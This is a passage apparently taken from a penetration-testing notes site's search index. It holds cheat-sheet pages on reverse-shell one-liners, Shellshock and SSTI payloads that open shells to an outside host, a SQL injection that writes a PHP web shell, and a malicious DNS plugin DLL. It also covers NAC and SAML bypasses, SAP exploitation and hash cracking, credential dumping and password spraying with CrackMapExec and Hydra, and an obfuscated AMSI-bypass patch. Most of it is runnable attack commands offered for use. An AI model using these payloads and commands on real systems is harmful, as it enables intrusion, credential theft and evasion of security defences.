https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ Onliner bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ "},"Pentest/Techniques/Shellshock.html":{"url":"Pentest/Techniques/Shellshock.html","title":"Shellshock","keywords":"","body":"ShellShock Table of content Description Description Iterate the cgi-bin directory agains *.sh, *.pl, *.cgi and *.py. When one script is found, use the nmap http-shellshock script: nmap -sV -p- --script http-shellshock nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls If vulnerable, it is possible to exploit it : # https://www.exploit-db.com/exploits/34900 shellshock.py payload=reverse rhost=10.10.10.56 lhost= lport= pages=/cgi-bin/user.sh Or manually through curl: # Reflected curl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE' # Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump) curl -H 'User-Agent: () { :; }; /bin/bash -c \"sleep 5\"' http://10.11.2.12/cgi-bin/admin.cgi # Out-Of-Band Use Cookie as alternative to User-Agent curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh "},"Pentest/Techniques/SQL injection.html":{"url":"Pentest/Techniques/SQL injection.html","title":"SQL Injection","keywords":"","body":"SQL Injection Table of content MySQL MySQL # Write PHP shell on system file http://10.11.1.252:8000/edit_type.php?type_id=5%20+UNION+ALL+SELECT+concat(char(60),%27?php+echo+shell_exec($_GET[%22cmd%22])+?%27,char(62))+INTO+dumpfile+%27/var/www/html/test1.php%27+--+- "},"Pentest/Techniques/SSTI.html":{"url":"Pentest/Techniques/SSTI.html","title":"SSTI","keywords":"","body":"SSTI Table of content Detection Jinja Detection {{7*7}} ${7*7} ${{7*7}} #{7*7} Jinja {{request.application.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/${ip}/${port} 0>&1\"').read()}} "},"Pentest/Technology/AD.html":{"url":"Pentest/Technology/AD.html","title":"AD","keywords":"","body":"AD Table of content Interesting groups DNS Admin DLL squeleton Steps AD Recycle Bin Interesting groups DNS Admin Users in this group can load a DLL in the dns service. Once the dns service is reloaded, it will execute the DLL with SYSTEM privileges. DLL squeleton #include #include BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } extern \"C\" __declspec(dllexport) DWORD WINAPI DnsPluginInitialize( PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction){ system(${command}) } extern \"C\" __declspec(dllexport) DWORD WINAPI DnsPluginCleanup(){ return ERROR_SUCCESS; } extern \"C\" __declspec(dllexport) DWORD WINAPI DnsPluginQuery(PSTR pszQueryName, DWORD wQueryType, PSTR pszRecordOwnerName, PVOID ppDnsRecordListHead){ return ERROR_SUCCESS; } Steps Load the malicious DLL:dnscmd ${ip} /config /serverlevelplugindll ${dllLocation} The ip is the ip of the DNS where the DLL must be load. It can be 127.0.0.1 if executed directly on the target machine. The dllLocation is the path to the malicious DLL. It can be an SMB path (\\\\10.10.10.10\\Share\\malicious.dll) Verify the DLL has been loaded: Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll Restart the service sc.exe stop dns && sc.exe start dns AD Recycle Bin Users in the group can browse the AD Recycle Bin that contains the deleted elements. # List all deleted AD users Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties * # Query a specific deleted user called Ben by SamAccountName Get-ADObject -Filter {SamAccountName -eq ${samAccountName}} -IncludeDeletedObjects -Properties * # Query a specific deleted user if we know the SID Get-ADObject -Filter {objectSid -eq \"${SID}\"} -IncludeDeletedObjects -Properties * # Restore the deleted AD user from the Active Directory Recycle Bin Get-ADObject -Filter {UserPrincipalName -eq \"${userPrincipalName}\"} -IncludeDeletedObjects -Properties * | Restore-ADObject "},"Pentest/Technology/IOS.html":{"url":"Pentest/Technology/IOS.html","title":"IOS","keywords":"","body":"IOS Table of content Extract SMS from IOS Create an encrypted backup Extract the information from the backup Locate the SMS database Retrieve SMS Extract SMS from IOS Create an encrypted backup Create an encrypted backup on iTunes and be sure you know the enccryption password. If you want to reset the password : Settings > General > Reset > Reset all settings Extract the information from the backup The following repo can be used to extracct information from IOS backup : https://github.com/dinosec/iphone-dataprotection Then retrieve the backup file on : %AppData%\\Apple Computer\\MobileSync\\Backup Then run : python iphone-dataprotection/python-scripts/backup_tools.py ${backupFile} ${outputDirectory} Locate the SMS database The SMS database is stored in HomeDomain/Library/SMS Retrieve SMS Open the database with sqlite3, and look at the table message "},"Pentest/Technology/NAC.html":{"url":"Pentest/Technology/NAC.html","title":"NAC","keywords":"","body":"NAC Table of content 802.1x Mac Address ByPass (MAB) EAP-TLS Standard network protection DHCP request close the switch port DHCP snooping Anti ARP spoofing Bypass NAC MAB MAC and IP usurpation Hold my beer ! EAP-TLS Bridged interfaces MAC and IP NAT Ressources 802.1x Mac Address ByPass (MAB) These configuration is usually set as the default case for devices that do not support 802.1X authentication. For example, a printer or VoIP phone hardly ever support certificate or password authentication. When a the MAB is enabled on a switch port, it will drop every frame except the first one. This frame is used to collect the device MAC address. Once the MAC is known, the switch contact the authentication Radius and to check if the MAC address is allowed to connect to the network. By default the MAB only supports single device per switch port. Thus, if two different MAC addresses are detected on the same port, a security violation error is raised and the port is closed. This behavior can be configured : Single-host mode: Only on MAC can be authenticated at the same time on the same switch port. Multi-domain mode: One host per data domain (VLAN Voice/VLAN Data) is allowed to be authenticated. This is the default configuration for switchs with IP phones connected. Multi-host: The first-connected device will open the switch port and all other devices can use the port without being authenticated. This mode is considered as unsecured and must not be used. EAP-TLS EAP is an authentication protocol. It is usually mixed with another protocol. The authentication packets are sent by the EAP protocol, but the authentication data are encapsulated in the EAP packet using another protocol such as TLS. The EAP-TLS authentication is based on the certificate. The user is authenticated using a TLS certificate stored on its machine. For example, on companies, usually, the ADCS ADCS generates a certificate and a GPO push it in the machine certificate store. Thus, when the machine is connected to the network, it can be authenticated on the switch using the certificate provided by the GPO. The following figure exposes the authentication requests performed during the EAP-TLS flow: Standard network protection DHCP request close the switch port The switch can be configured to close the port when a DHCP request is sent. Thus, during the audit, it is recommended to deactivate the Windows network interface used cause it is hardly possible to avoid Windows to perform unwanted requests. Moreover, it is recommended to always use static IP. DHCP snooping The DHCP snooping is a switch configuration that allows the switch to listen the DHCP traffic and drop potentially malicious requests Anti ARP spoofing The name tell everything. This protection mitigates ARP spoofing attacks. Bypass NAC MAB MAC and IP usurpation The easiest way to bypass MAB authentication is to spoof the MAC and the IP. However, some NAC solution implements a profiling mechanism. This mechanism collects some data from the equipment that could not be known by an attacker such as its DHCP identifier, its Serial number, etc. and use them to determine the profile of the equipment. For example, when an VoIP equipment initializes an authentication, its DHCP identifier is sent to the RADIUS. The RADIUS verify that the furnished DHCP identifier match with the MAC address filled in. If it doesn't the authentication is refused. Thus, this profiling method is a security through obscurity mechanism that allows to slightly increase the MAB authentication security. Hold my beer ! Some switches are misconfigured and do not close the port when the equipment is unplugged. Thus, it is possible to unplug a legit equipment, spoof its MAC and IP and then connect it to the network. Because the switch does not close the port, it will not ask for a reauthentication and the equipment will be allowed to access to the network. Because the authenticate step has not been triggered, the RADIUS will not check for the new equipment profile. EAP-TLS Bridged interfaces The client must send a certificate to authenticate himself. Thus, an attacker spoofing its MAC will not be able to finalize the authentication process. The idea of this attack is to let the equipment to authenticate itself on the switch through a controlled machine. Because the NAC does not authenticate the equipment itself but the switch port, it will accept packets coming from the attacker machine. For that, the attacker must be set in man in the middle position and forward all packets from the legit equipment to the NAC switch. Prerequis A Linux machine Two networks interfaces A machine allowed to access to the network Steps Install the bridge-utils package :sudo apt-get install bridge-utils -y Bridge your two interfaces :brctl addbr br0 # create the bridge brctl addif br0 eth1 # add eth1 to the bridge brctl addif br0 eth2 # add eth2 to the bridge # activate all interfaces ip l set eth1 up ip l set eth2 up ip l set br0 up Configure the Linux kernel to forward EAP requests :echo 8 > /sys/class/net/br0/bridge/group_fwd_mask Deactivate the firewall :sudo ufw disable sudo iptables -I FORWARD -j ACCEPT ` Give an IP to the br0 interface (static or DHCP) Connect the NAC switch and the legit equipement to your network adaptaters. It does not work This technique can failed due to several protections. If the DHCP is configured to only gave address to domain computer, the br0 interface will not be able to retrieve the address. Sometimes, NAC switch can be configured to reauthenticate users when a DHCP request is sent. If the NAC is configured with the Single-host mode, the br0 MAC address must spoof the legit equipment address. The DHCP snooping and anti ARP spoofing can forbid use of static IP, thus, the it will not be possible to give IP to the br0 interface. MAC and IP NAT In order to bypass restriction on IP attribution on the br0 interface it is possible to use NAT IP and NAT MAC. All the traffic can be natted to simulate it comes from the legit computer and not from the attacker machine. The idea is, as previously, create a bridge between your the two network interfaces. Then, IPTABLES and EBTABLES are used to establish NAT rules: ebtables -A POSTROUTING -s ${interfaceMAC} -o ${networkInterfaceName} -j snat --to-src ${legitEquipmentMAC} --snat-target ACCEPT ebtables -A POSTROUTING -s br0 -o ${networkInterfaceName} -j snat --to-src ${legitEquipmentMAC} --snat-target ACCEPT iptables -A POSTROUTING -s 169.254.66.66/32 -o br0 -p tcp -j SNAT --to-source ${legitEquipementIP}:61000-62000 iptables -A POSTROUTING -s 169.254.66.66/32 -o br0 -p udp -j SNAT --to-source ${legitEquipementIP}:61000-62000 iptables -A POSTROUTING -s 169.254.66.66/32 -o br0 -p icmp -j SNAT --to-source ${legitEquipementIP} The following script will do the whole configuration : https://github.com/scipag/nac_bypass Once the script finished, your computer is able to access to the network. Ressources NAC bypass scripts : https://github.com/scipag/nac_bypass "},"Pentest/Technology/Port Knocking.html":{"url":"Pentest/Technology/Port Knocking.html","title":"Port Knocking","keywords":"","body":"Port Knocking Table of content Description Nmap Description Port knocking is a security by obscurity technique that allows to open a port when some port are knocked in a defined order. For example, the port 22 is filtered. If anyone send a SYN packet on port 567, 356 and 4000 then the port 22 will appear open. Nmap for x in 567 356 4000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done "},"Pentest/Technology/SAML.html":{"url":"Pentest/Technology/SAML.html","title":"SAML","keywords":"","body":"SAML Table of content Résumé des principaux tests SAML Raider Flow d'authentification SAML Vocabulaire Etapes du flow Signature Wrapping Signature Exclusion XXE on SAML XSLT injection on SAML Certificat Faking How to Token Recipient Confusion Replay attacks Résumé des principaux tests Vérifier si le SP accepte une assertion sans signature : Signature exclusion attack Vérifier si le SP est sensible au XML Signature Wrapping Vérifier si le SP check que les assertions viennent d'un IDP de confiance : Certificate Faking Vérifier si le SP est vulnérable aux injection XML ou XSLT : XXE et XSLT injection Vérifier si le SP accepte les assertion générer pour un autre SP par un IDP commun : Token Recipient Confusion Vérifier si les réponses SAML peuvent être rejouées : Replay attack SAML Raider SAML raider est une extension Burp permettant de décoder, afficher et modifier les requêtes SAML ansi que de faciliter la mise en place d'attaques de base sur le protocole SAML. Ouvrir Burp et se rendre sur l'onglet Extender Aller sur l'onglet BApp Store Cliquer sur l'extension SAML Raider Cliquer sur le bouton Install en bas à gauche Un fois installée, l'extension ajoute un onglet SAML Raider Certificates à l'interface Burp. Via l'onglet Proxy, lorsqu'une requête SAML est interceptée, il est possible d'activer le plugin SAML Raider en cliquand sur la dropdown en haut à droite de la fenêtre. L'onglet SAML Raider Certificates permet de jouer avec les certificats qui seront utilisés dans les requêtes SAML : Importer et Exporter des certificats X.509 Afficher les informations d'un certificat X.509 Clone des certificats X.509 et leur chaine de certificats Importer et exporter les clés privées si disponible Editer et auto-signer des certificats X.509 existant Flow d'authentification SAML Vocabulaire SP : Service provider : l'application qui demande l'authentification IDP : Identity provider : l'application qui va vérifier les paramètres d'authentification de l'utilisateur Etapes du flow L'utilisateur accède à l'application qu'il souhaite utiliser. L'application détecte l'origine de l'utilisateur et le redirige vers l'IDP afin qu'il s'authentifie. C'est la requête d'authentification. L'utilisateur s'authentifie sur l'IDP L'IDP génère une réponse d'authentification sous la forme d'un document XML contenant les informations d'identification de l'utilisateur (nom d'utilisateur, email, etc...). La réponse est signée avec un certificat X.509 inclue dans la réponse. LE SP, qui connait l'IDP et possède l'empreinte de son certificat, récupère la réponse d'authentification, valide le certificat et valide l'intégrité des données de la réponse. L'identité de l'utilisateur est confirmé, et il peut avoir accès à l'application. Signature Wrapping TODO Signature Exclusion Cette attaque à pour but de vérifier la comportement du SP lorsqu'il recoit des réponses SAML non signée. Une réponse SAML contient une partie signature sous la forme : ... Il faut donc supprimer la partie signature afin que la réponse ait la forme suivante : ... XXE on SAML Injecter une entité externe dans la réponse SAML: %xxe;]> ... Il suffit de mettre un serveur web en place sur l'IP 10.10.10.10 et de voir si le SP effectue une requête vers ce serveur web. XSLT injection on SAML XSLT ou Extensible Stylesheet Language Transformation est un langage permettant de transformer des documents XML en d'autres types de documents tel que le HTML, le JSON ou le PDF. Il n'est pas nécessaire d'avoir une signature valide de la réponse pour mettre en place cette attaque. Ainsi, il est possible de signer la réponse avec un certificat auto-signé. L'attaque consisteà injecter un payload XSLT dans un élément XML Transformà l'intérieur de l'élément Signature de la réponse SAML. ... ... Certificat Faking Le principe de cette attaque est de modifier le certificat embarqué dans la réponse SAML par un certificat auto-signé, de modifier les éléments de la réponse SAML et de les resigner avec la clé privé du certificat auto-signé. How to Intercepter la réponse SAML L'ouvrir avec l'extension SAML Raider Cliquer sur Send Certificate to SAML Raiders Certs Dans l'onglet SAML Raider Certificates, sélection le certificat et cliquer sur Save and Self-Sign Retourner sur l'onglet Proxy:Intercept Selection le certificat auto-signé Cliquer sur Remove Signature Cliquer sur (Re-)Sign Message Si la réponse contient les jetons d'authentification alors, le SP ne vérifie pas l'authenticité du certificat. Il est donc possible d'altérer les paramètres des réponses SAML. Token Recipient Confusion TODO Replay attacks Rejouer les réponses SAML : les réponses SAML ne sont valable qu'une fois. S'il est possible de rejouer les requêtes, alors un attaquant peut capturer ces paquets, les rejouer et by-passer l'authentification. "},"Pentest/Technology/SAP.html":{"url":"Pentest/Technology/SAP.html","title":"SAP","keywords":"","body":"SAP Table of content MSF Plugin Enumeration Brute force Standard exploits SAP service gSOAP Web interface Thick client RFC Display table SAP table User information USR02 UST04 AGR_PROF USR40 Functionnal table PA0008 System table RFCDES Transactions SUIM RSUSR003 ST04 SE17 SE16 SM49 SM59 Configuration review Password policy User able to run a given transaction References MSF Plugin Enumeration auxiliary/scanner/sap/sap_icm_urlscan Scan unauthenticated SAP URI. It can find some administration without access control. It could be then interesting to run a webscreenshotter on these URL to easily detect sensitive accessible pages. auxiliary/scanner/sap/sap_icf_public_info Retrieve SAP publicly available information such as SAP service exposed, database server, mandant, etc... Brute force SAP implement anti-bruteforce mecanism, be careful or you will lock all your accounts auxiliary/scanner/sap/sap_web_gui_brute_login Perform a PING RFC request with Authorization header (base64(username:password)) Standard exploits It can be usefull to launch these exploit. However, these exploits can triggered SOC alerts exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec exploit/multi/sap/sap_soap_rfc_sxpg_command_exec auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec exploit/windows/http/sap_host_control_cmd_exec exploit/multi/sap/sap_mgmt_con_osexec_payload exploit/windows/http/sap_configservlet_exec_noauth exploit/windows/misc/sap_netweaver_dispatcher SAP service gSOAP Port : 5X013 The X value is the number of the SAP instance The WSDL file can be downloaded at : http://ip:50013/IciActionItemService/IciActionItemConf?wsdl It is possible to download Java SAP administration console with an HTTP request wget ip:5X13/sapmc.jar -o sapmc.jar wget ip:5X13/sapmcsoap.jar -o sapmcsoap.jar wget ip:5X13/sapmcswing.jar -o sapmcswing.jar wget ip:5X13/frog.jar -o frog.jar Then, the application can be launched using : java -classpath \"./sapmc.jar;./sapmcsoap.jar;./sapmcswing.jar;./frog.jar\" com/sap/managementconsole/swing/main/ManagementConsole Web interface To loggin through the web interface go on the URI /WEBGUI Several administration pages are exposed as webservice (WebDynPro) Thick client SAP communication are usually performed on port 3201. The data flux is compressed, but Wireshark plugins can decompress the data on the fly. https://github.com/SecureAuthCorp/SAP-Dissection-plug-in-for-Wireshark Just download the dll in the release section and copy it here %wireshark%/plugins/cpan/ Once, network packets decompressed, it could be possible to see connection informations as it is shown in the following figure : The figure shows the connection of the user EARLYWATCH on the mandant 066 using the password SUPPORT The following figure shows the Wireshark result if packets are ciphered: RFC RFC are SOAP request allowing to mimic some actions performed by SAP transaction such as displaying table, retrieving information... Display table The following request can be used to display an SAP table through RFC | TABLE NAME FIELD TO DISPLAY To minimize the number of result displayed, it is possible to add the 10 tag before the closing RFC_READ_TABLE tag. SAP table User information USR02 This table contains the username, password and role of the users. BNAME : Field storing the username BCODE : Field storing the password hash key PASSCODE : Field storing the password hash (SHA1 - 160bits) PWDSALTEDHASH : Field storing the password hash (Various hash algorithm) UFLAG : Field storing the user lock status 0 : Account unlocked 32 : Locked by CUA central administration 64 : Locked by administrator 128 : Locked after failed logon When retrieved through RFC, BCODE and PASSCODE will be trucated and it hardly possible to retrieve the password. However, the PWDSALTEDHASH can be completely retrieved through RFC and thus be cracked using hashcat. # Create a wordlist with base words stored in file.txt and apply hashcat rules on it git clone https://github.com/praetorian-inc/Hob0Rules hashcat -r Hob0Rules/d3adhob0.rule --stdout file.txt > wordlist.txt # Launch hascat with wordlist hashcat -m 10300 hash.txt wordlist.txt -o cracked.out --force UST04 This table allows to map profile with users. BNAME : Field storing the username PROFILE : Field storing the profile name AGR_PROF This table is used to store Profile name for role data. PROFILE : Field storing the profile name AGR_NAME : Field storing the role name USR40 This table allow to password restriction. Every value entered in the table will be forbidden as password. Foor example, if the value AB*is entered, every password beginning with AB will be denied. Functionnal table These table containes sensitive buisness information such as worker salary. PA0008 This table contains the detail of basic pay (worker salary for example) PERNR : Field storing the personnal number BET01 : Field storing the wage type amount for payments ENDDA : Field storing the end date BEGDA : Field storing the start date System table RFCDES This table contains the RFC connections declared RFCDEST : Field storing the logical destination of the RFC connexion Transactions On the thick client, transactions can be run as it is shown in the following figure : SUIM User information system RSUSR003 Check standard user password ST04 Database performance monitor Allows execution of row SQL query and can be used to rebound from one mandant to another SE17 General table display Can be used to partially retrieve de user database SE16 Display table content Can be used to partially retrieve de user database SM49 Execute logical command SM59 RFC destination (Display/Maintain) Allows to display RFC connections and the links between different systems Configuration review Password policy The pasword policy can be explored through the RZ11 transaction and by looking at the following parameters login/failed_user_auto_unlock login/fails_to_user_lock login/min_password_diff login/min_password_digits login/min_password_letters login/min_password_lng login/min_password_lowercase login/min_password_specials login/min_password_uppercase login/no_automatic_user_sapstar login/password_compliance_to_current_policy login/password_downwards_compatibility login/password_expiration_time login/password_history_size User able to run a given transaction It is possible to retrieve users that has the privileged need to run a given transaction through the SUIM transaction and by following this scheme: SUIM > User > User with complexe criteria > By transaction autorisation It is interesting to look at the SM49, SE16 and the ST04 transaction. References Search field or tables : https://www.se80.co.uk/sap-tables/list/ Seach for transaction : https://www.se80.co.uk/sap-tcodes/list/ Administration transaction list : https://wiki.scn.sap.com/wiki/display/ABAP/Useful+SAP+System+Administration+Transactions?original_fqdn=wiki.sdn.sap.com&showComments=false Password security : https://blogs.sap.com/2020/06/25/sap-password-hashes-security/ "},"Pentest/Tools/BloundHound.html":{"url":"Pentest/Tools/BloundHound.html","title":"BloundHound","keywords":"","body":"BloundHound Table of content Launch neo4j database service Launch SharpHound collector BloundHound Quick Win Launch neo4j database service net start neo4j Launch SharpHound collector # Launch a cmd as domain user runas /netonly /noprofile /user:${domain}\\${user} cmd.exe # Launch collector SharpHound.exe -c all -d ${domain} --domaincontroller ${dcIp} --overrideusername ${domainUser} --ldapusername ${domainUser} --ldappassword ${password} BloundHound Quick Win https://github.com/kaluche/bloodhound-quickwin "},"Pentest/Tools/CME.html":{"url":"Pentest/Tools/CME.html","title":"CME","keywords":"","body":"CME Table of content Password spraying Get password policy Execute command Copy file from server to host Dump sam Dump lsass Create UNC file Enumerate users Password spraying Be carefull, it does not check the password policy ! cme smb ${dcIp} -u ${userList.txt} -p ${password} -d ${domain} --continue-on-success Use --local-auth to perform local authentication Get password policy cme smb ${domainServer} -u ${username} -p ${password} --pass-pol Execute command cme smb ${serverIp} -u ${username} -p ${password} -x ${command} Copy file from server to host cme smb ${serverIp} -u ${username} -p ${password} --get-file ${remotePath} ${localPath} Dump sam cme smb ${serverIp} -u ${username} -p ${password} --sam Dump lsass cme smb ${serverIp} -u ${username} -p ${password} -M lsassy Create UNC file Generate and deploy the UNC file cme smb ${serverIp} -u ${username} -p ${password} -M slinky -o NAME=${shareName} SERVER=${ntlmRelayxIp} Clean up you mess cme smb ${serverIp} -u ${username} -p ${password} -M slinky -o NAME=${shareName} SERVER=${ntlmRelayxIp} CLEANUP=True Enumerate users cme smb ${serverIp} -u ${username} -p ${password} --rid-brute "},"Pentest/Tools/Curl.html":{"url":"Pentest/Tools/Curl.html","title":"Curl","keywords":"","body":"Curl Table of content Get response header Get response header curl -s -I ${url} "},"Pentest/Tools/Ffuf.html":{"url":"Pentest/Tools/Ffuf.html","title":"FFUF","keywords":"","body":"FFUF Table of content Basic directory discovery Fuzz extensions POST requests Fuzz with cookies Through SOCKS5 Basic directory discovery ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php -u ${ip}/FUZZ Fuzz extensions ffuf -e .php,.txt POST requests ffuf -X POST -d 'username=admin&password=FUZZ' Fuzz with cookies ffuf -b \"${cookie}=${value}\" Through SOCKS5 ffuf -x socks5://${ip}/${port} "},"Pentest/Tools/Find.html":{"url":"Pentest/Tools/Find.html","title":"Find","keywords":"","body":"Find Table of content Exec Exec find / -exec grep -i pass {} \\; -print 2> /dev/null "},"Pentest/Tools/Hydra.html":{"url":"Pentest/Tools/Hydra.html","title":"Hydra","keywords":"","body":"Hydra Table of content Change port Basic auth HTTPS form HTTP form SMB SSH MSSQL Change port hydra -s ${port} Basic auth hydra ${ip} -l ${user} -P ${password} https-get ${URI} HTTPS form hydra ${ip} -l ${user} -P ${passwordList} https-post-form '${URI}:${POSTParameters}:${echecValue}' Example : hydra 10.10.10.43 -l test -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form '/db/index.php:passwor d=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password' HTTP form hydra ${ip} -l ${user} -P ${passwordList} http-post-form '${URI}:${POSTParameters}:${echecValue}' SMB hydra ${ip} -l ${user} -P ${passwordList} smb SSH hydra ${ip} -l ${user} -P ${passwordList} ssh MSSQL hydra ${ip} -l ${user} –P ${passwordList} mssql "},"Pentest/Tools/PowerView.html":{"url":"Pentest/Tools/PowerView.html","title":"PowerView","keywords":"","body":"Powerview Table of content Import PowerView Users info Domain users SPN users GMSA ReadPassword ASREP users Domain admins Domain trust Get all domain trust TrustType: TrustAttributes: Get information from a trusted domain Kerberoasting DCSync Unconstrained Delegation Users that can modify GPO ACL on users Grant DCSync Ressource Import PowerView The Execution policy must be set to ByPass Import-Module .\\powerview.ps1 If there it is blocked by the AMSI, launch the following code before reimporting: #Rasta-mouses Amsi-Scan-Buffer patch \\n $dpqmb = @\" using System; using System.Runtime.InteropServices; public class dpqmb { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr bqvxfg, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $dpqmb $shxnhxm = [dpqmb]::LoadLibrary(\"$([CHaR]([bYtE]0x61)+[Char](109*80/80)+[chAr]([bYte]0x73)+[CHAR](57+48)+[chAR](46*12/12)+[cHAr]([Byte]0x64)+[ChaR]([BYtE]0x6c)+[chAR](55+53))\") $dewhnt = [dpqmb]::GetProcAddress($shxnhxm, \"$(('ÀmsîScã'+'nBuffer').NormALizE([ChAr](23+47)+[CHAR](111)+[CHAr]([BYTe]0x72)+[CHAr]([bYTe]0x6d)+[cHaR]([ByTE]0x44)) -replace [chaR]([BYte]0x5c)+[ChAr](42+70)+[Char](123*119/119)+[Char](77+31-31)+[chaR](3+107)+[cHAR]([bytE]0x7d))\") $p = 0 [dpqmb]::VirtualProtect($dewhnt, [uint32]5, 0x40, [ref]$p) $jojn = \"0xB8\" $mbww = \"0x57\" $rjsu = \"0x00\" $bbnx = \"0x07\" $uxow = \"0x80\" $aask = \"0xC3\" $xmpmv = [Byte[]] ($jojn,$mbww,$rjsu,$bbnx,+$uxow,+$aask) [System.Runtime.InteropServices.Marshal]::Copy($xmpmv, 0, $dewhnt, 6) Users info Domain users Dump all domain users Get-DomainUser -domain ${domain} -server ${dcIp} SPN users Dump users with SPN that can be used in Kerberoasting Get-DomainUser -SPN -domain ${domain} -server ${dcIp} GMSA ReadPassword Get list of users that can read GMSA passwords Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword | Where-Object{$_[\"msDS-ManagedPassword\"] -ne \"\"} ASREP users Dump users whose Kerberos tickets can be retrieved without domain account Get-DomainUser -PreauthNoRequired -domain ${domain} -server ${dcIp} Domain admins Dump domain admins users Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse -domain ${domain} -server ${dcIp} Domain trust Get all domain trust It will display all trusted domain and the information about these trust links Get-DomainTrust -domain ${domain} -server ${dcIp} TrustType: DOWNLEVEL/WINDOWS_NON_ACTIVE_DIRECTORY (0x00000001) : a trusted Windows domain that IS NOT running Active Directory. UPLEVEL/WINDOWS_ACTIVE_DIRECTORY (0x00000002) : a trusted Windows domain that IS running Active Directory. MIT (0x00000003) : a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120. TrustAttributes: NON_TRANSITIVE (0x00000001) : the trust cannot be used transitively. That is, if Domain A trusts Domain B and Domain B trusts Domain C, then Domain A does not automatically trust Domain C. Also, if a trust is non-transitive, then you will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive. UPLEVEL_ONLY (0x00000002) : only Windows 2000 operating system and newer clients can use the trust. QUARANTINED_DOMAIN/FILTER_SID (0x00000004) : SID filtering is enabled. FOREST_TRANSITIVE (0x00000008) : cross-forest trust between the root of two domain forests running at least domain functional level 2003 or above. CROSS_ORGANIZATION (0x00000010) : the trust is to a domain or forest that is not part of the organization, which adds the OTHER_ORGANIZATION SID. This is a bit of a weird one. I don't remember encountering this flag in the field, but according to this post it means that the selective authentication security protection is enabled. For more information, check out this MSDN doc. WITHIN_FOREST (0x00000020) : the trusted domain is within the same forest, meaning a parent->child or cross-link relationship TREAT_AS_EXTERNAL (0x00000040) : the trust is to be treated as external for trust boundary purposes. According to the documentation, \"If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering. Cross-forest trusts are more stringently filtered than external trusts. This attribute relaxes those cross-forest trusts to be equivalent to external trusts.\" This sounds enticing, and I'm not 100% sure on the security implications of this statement. USES_RC4_ENCRYPTION (0x00000080) : if the TrustType is MIT, specifies that the trust that supports RC4 keys. USES_AES_KEYS (0x00000100) : not listed in the linked Microsoft documentation, but according to some documentation I've been able to find online, it specifies that AES keys are used to encrypt KRB TGTs. CROSS_ORGANIZATION_NO_TGT_DELEGATION (0x00000200) : \"If this bit is set, tickets granted under this trust MUST NOT be trusted for delegation.\" This is described more in MS-KILE 3.3.5.7.5 (Cross-Domain Trust and Referrals) PIM_TRUST (0x00000400) : \"If this bit and the TATE (treat as external) bit are set, then a cross-forest trust to a domain is to be treated as Privileged Identity Management trust for the purposes of SID Filtering.\" According to MS-PAC 4.1.2.2 (SID Filtering and Claims Transformation), \"A domain can be externally managed by a domain that is outside the forest. The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.\" While I have not seen this in the field, and it's only supported by domain functional level 2012R2 and above, it also warrants further investigation Get information from a trusted domain DcIp is the IP is the IP of the initial domain controller Get-DomainUser -domain ${trustedDomain} -server ${dcIp} Kerberoasting Collected hash need to be cracked Invoke-Kerberoast -domain ${domain} -server ${dcIp} -OutputFormat John| fl The output format can be modify to format hash for John or Hashcat DCSync secretsdump.py ${domain}/${user}@${dcIp} -just-dc-user ${adminUserToPwn} Unconstrained Delegation Get-DomainComputer -Unconstrained Users that can modify GPO Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl It will return the SID of the users that can modify the GPO. The SID can be translated using ConvertFrom-SID Likewise, it is possible to retrieve the GPO that can be modified by agiven user: Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"WriteProperty|WriteDacl|WriteOwner\" -and $_.SecurityIdentifier -match \"${userSID}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl ACL on users Retrieve the ACL compromisedUser can modify on the userTargeted object. Get-DomainObjectAcl -Identity ${userTargeted} | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" 